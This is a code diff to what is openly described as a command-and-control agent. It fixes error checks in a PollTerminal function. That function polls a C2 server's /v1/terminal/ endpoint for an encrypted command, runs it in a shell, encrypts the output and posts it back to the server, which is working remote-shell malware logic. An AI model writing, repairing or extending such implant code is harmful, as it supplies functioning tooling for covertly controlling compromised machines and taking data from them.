@@ -18,7 +18,7 @@ fn terminalURL(baseURL: *u8, agentID: *u8) -> (*u8, *u8) {
             var raw: *void
             var err0: *u8
             raw, err0 = runtime.Alloc(n)
-            if err0 != 0 {
+            if err0 != null {
                 return null, err0
             }
             var b: *u8 = cast[*u8](raw)
@@ -30,7 +30,7 @@ fn terminalURL(baseURL: *u8, agentID: *u8) -> (*u8, *u8) {
             *(b + n - 1) = 0
             mid, err1 := strings.Append(b, "/v1/terminal/")
             runtime.Free(b)
-            if err1 != 0 {
+            if err1 != null {
                 return null, err1
             }
             defer runtime.Free(mid)
@@ -38,7 +38,7 @@ fn terminalURL(baseURL: *u8, agentID: *u8) -> (*u8, *u8) {
         }
     }
     mid2, err2 := strings.Append(base, "/v1/terminal/")
-    if err2 != 0 {
+    if err2 != null {
         return null, err2
     }
     defer runtime.Free(mid2)
@@ -53,13 +53,13 @@ fn terminalURL(baseURL: *u8, agentID: *u8) -> (*u8, *u8) {
 // key/keyLen must match the C2 server -key.
 fn PollTerminal(baseURL: *u8, agentID: *u8, key: *u8, keyLen: u64) -> *u8 {
     url, err := terminalURL(baseURL, agentID)
-    if err != 0 {
+    if err != null {
         return err
     }
     defer runtime.Free(url)
 
     resp, err2 := net.Get(url)
-    if err2 != 0 {
+    if err2 != null {
         return err2
     }
     defer net.FreeResponse(resp)
@@ -75,7 +75,7 @@ fn PollTerminal(baseURL: *u8, agentID: *u8, key: *u8, keyLen: u64) -> *u8 {
     }
 
     cmd, cmdN, err3 := Open(resp.body, key, keyLen)
-    if err3 != 0 {
+    if err3 != null {
         return err3
     }
     defer runtime.Free(cmd)
@@ -84,7 +84,7 @@ fn PollTerminal(baseURL: *u8, agentID: *u8, key: *u8, keyLen: u64) -> *u8 {
     }
 
     out, err4 := process.ShellOutput(cmd)
-    if err4 != 0 {
+    if err4 != null {
         return err4
     }
     defer free(out)
@@ -96,13 +96,13 @@ fn PollTerminal(baseURL: *u8, agentID: *u8, key: *u8, keyLen: u64) -> *u8 {
         plen = len(out)
     }
     sealed, err5 := Seal(plain, plen, key, keyLen)
-    if err5 != 0 {
+    if err5 != null {
         return err5
     }
     defer runtime.Free(sealed)
 
     post, err6 := net.Post(url, "text/plain", sealed, __strlen(sealed))
-    if err6 != 0 {
+    if err6 != null {
         return err6
     }
     net.FreeResponse(post)
